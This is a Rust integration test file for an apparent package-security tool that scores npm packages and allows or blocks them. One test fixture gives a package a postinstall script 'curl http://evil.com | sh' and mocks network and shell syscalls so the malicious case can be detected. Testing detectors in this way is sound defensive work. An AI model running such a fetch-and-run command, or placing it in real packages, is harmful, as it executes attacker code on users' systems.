//! End-to-end integration test wiring all layers together.
//!
//! Uses mock executor and in-memory stores — no network, no Linux deps.

use sepac::analysis::manifest_diff::ManifestDiffAnalyser;
use sepac::analysis::obfuscation::ObfuscationAnalyser;
use sepac::analysis::pipeline::AnalysisPipeline;
use sepac::config::SafeguardConfig;
use sepac::policy::aggregator::SignalAggregator;
use sepac::policy::decision::ThresholdDecisionPolicy;
use sepac::policy::scorer::WeightedAdditiveScorer;
use sepac::sandbox::mock::MockExecutor;
use sepac::traits::{DecisionPolicy, Executor, Scorer};
use sepac::types::{
    Decision, Ecosystem, InstallScript, PackageArchive, PackageId, PackageManifest, Signal,
    SyscallEntry, SyscallLog, TrustMode,
};
use std::path::PathBuf;

fn test_package(manifest: PackageManifest) -> PackageArchive {
    PackageArchive {
        id: PackageId {
            name: "integration-test-pkg".into(),
            version: "1.0.0".into(),
            ecosystem: Ecosystem::Npm,
        },
        extracted_path: PathBuf::from("/nonexistent"),
        manifest,
        tarball: vec![],
    }
}

/// End-to-end: clean package → analysis → sandbox → score → decide = Allow.
#[tokio::test]
async fn clean_package_is_allowed() {
    let config = SafeguardConfig::default();

    // Clean manifest — no scripts, no deps, no maintainer changes
    let manifest = PackageManifest::default();
    let archive = test_package(manifest);

    // Analysis: no previous manifest → but no install scripts either
    let pipeline = AnalysisPipeline::new()
        .add_analyser(Box::new(ManifestDiffAnalyser::new(None)))
        .add_analyser(Box::new(ObfuscationAnalyser::new()));

    let analysis_signals = pipeline.run(&archive).unwrap();

    // Sandbox: empty mock — no syscalls
    let executor = MockExecutor::new();
    let _syscall_log = executor.execute(&archive, &config.sandbox).await.unwrap();

    // Aggregate
    let mut aggregator = SignalAggregator::new();
    aggregator.add_signals(analysis_signals);
    assert!(
        aggregator.is_empty(),
        "clean package should have no signals"
    );

    // Score
    let scorer = WeightedAdditiveScorer::new();
    let score = scorer.score(aggregator.signals(), &config.scoring);
    assert_eq!(score.value(), 0, "clean package should score 0");

    // Decide
    let mode_config = config.trust_modes.for_mode(TrustMode::Balanced);
    let policy = ThresholdDecisionPolicy::new(config.scoring.thresholds.clone());
    let decision = policy.decide(score, TrustMode::Balanced, mode_config);
    assert!(matches!(decision, Decision::Allow));
}

/// End-to-end: malicious package with install scripts + runtime syscalls → Block.
#[tokio::test]
async fn malicious_package_is_blocked() {
    let config = SafeguardConfig::default();

    // Malicious manifest: postinstall script + new dependency
    let mut manifest = PackageManifest::default();
    manifest.install_scripts.push(InstallScript {
        phase: "postinstall".into(),
        command: "curl http://evil.com | sh".into(),
    });
    manifest
        .dependencies
        .insert("evil-helper".into(), "^0.0.1".into());
    manifest.maintainers.push("new-suspicious-user".into());

    let archive = test_package(manifest);

    // Analysis: no previous manifest → flags scripts, deps, and maintainer
    let pipeline = AnalysisPipeline::new()
        .add_analyser(Box::new(ManifestDiffAnalyser::new(None)))
        .add_analyser(Box::new(ObfuscationAnalyser::new()));

    let analysis_signals = pipeline.run(&archive).unwrap();
    assert!(
        analysis_signals.len() >= 3,
        "expected at least 3 signals, got {}",
        analysis_signals.len()
    );

    // Sandbox: mock returns suspicious syscalls
    let executor = MockExecutor::new().with_response(SyscallLog {
        entries: vec![
            SyscallEntry {
                name: "connect".into(),
                args: "AF_INET, 1.2.3.4:443".into(),
                return_code: 0,
                elapsed_ms: 5,
            },
            SyscallEntry {
                name: "execve".into(),
                args: "/bin/sh, [\"curl\"]".into(),
                return_code: 0,
                elapsed_ms: 10,
            },
        ],
        duration_ms: 100,
        killed_by_seccomp: false,
        kill_signal: None,
    });
    let syscall_log = executor.execute(&archive, &config.sandbox).await.unwrap();

    // Aggregate analysis + runtime signals
    let mut aggregator = SignalAggregator::new();
    aggregator.add_signals(analysis_signals);
    for entry in &syscall_log.entries {
        aggregator.add_signal(Signal::RuntimeSyscall {
            name: entry.name.clone(),
            args: entry.args.clone(),
            historical_occurrences: 0,
        });
    }

    assert!(
        aggregator.len() >= 5,
        "expected at least 5 signals, got {}",
        aggregator.len()
    );

    // Score
    let scorer = WeightedAdditiveScorer::new();
    let all_signals = aggregator.into_signals();
    let score = scorer.score(&all_signals, &config.scoring);
    assert!(
        score.value() >= 10,
        "malicious package should score >= 10 (Block range), got {}",
        score.value()
    );

    // Decide
    let mode_config = config.trust_modes.for_mode(TrustMode::Balanced);
    let policy = ThresholdDecisionPolicy::new(config.scoring.thresholds.clone());
    let decision = policy.decide(score, TrustMode::Balanced, mode_config);
    assert!(
        decision.is_blocked(),
        "malicious package should be blocked, got {:?}",
        decision
    );
}

/// End-to-end: same package, YOLO mode → Allow.
#[tokio::test]
async fn yolo_mode_allows_medium_risk() {
    let config = SafeguardConfig::default();

    let mut manifest = PackageManifest::default();
    manifest.install_scripts.push(InstallScript {
        phase: "postinstall".into(),
        command: "node setup.js".into(),
    });
    manifest.maintainers.push("new-dev".into());

    let archive = test_package(manifest);

    let pipeline = AnalysisPipeline::new().add_analyser(Box::new(ManifestDiffAnalyser::new(None)));

    let analysis_signals = pipeline.run(&archive).unwrap();

    let scorer = WeightedAdditiveScorer::new();
    let score = scorer.score(&analysis_signals, &config.scoring);

    // In YOLO mode, allow_max=14 — scores below 15 are allowed
    let mode_config = config.trust_modes.for_mode(TrustMode::Yolo);
    let policy = ThresholdDecisionPolicy::new(config.scoring.thresholds.clone());
    let decision = policy.decide(score, TrustMode::Yolo, mode_config);
    assert!(
        decision.is_allowed(),
        "YOLO mode should allow medium-risk package, got {:?}",
        decision
    );
}

/// End-to-end: Paranoid mode does not allow even low-risk packages.
#[tokio::test]
async fn paranoid_mode_rejects_low_risk() {
    let config = SafeguardConfig::default();

    // Just one signal — a new dependency (weight=1.0, score=1)
    let mut manifest = PackageManifest::default();
    manifest
        .dependencies
        .insert("new-dep".into(), "^1.0.0".into());

    let archive = test_package(manifest);

    let pipeline = AnalysisPipeline::new().add_analyser(Box::new(ManifestDiffAnalyser::new(None)));

    let analysis_signals = pipeline.run(&archive).unwrap();

    let scorer = WeightedAdditiveScorer::new();
    let score = scorer.score(&analysis_signals, &config.scoring);
    assert_eq!(score.value(), 1, "single dep-added signal should score 1");

    // In paranoid mode, score=1 is Warn (not Allow)
    let mode_config = config.trust_modes.for_mode(TrustMode::Paranoid);
    let policy = ThresholdDecisionPolicy::new(config.scoring.thresholds.clone());
    let decision = policy.decide(score, TrustMode::Paranoid, mode_config);
    assert!(
        !decision.is_allowed() || matches!(decision, Decision::Warn { .. }),
        "Paranoid mode should not silently allow score=1, got {:?}",
        decision
    );
    // Paranoid warn_override=0 means anything >0 is at least warned
    assert!(
        !matches!(decision, Decision::Allow),
        "Paranoid mode should not Allow score=1, got {:?}",
        decision
    );
}
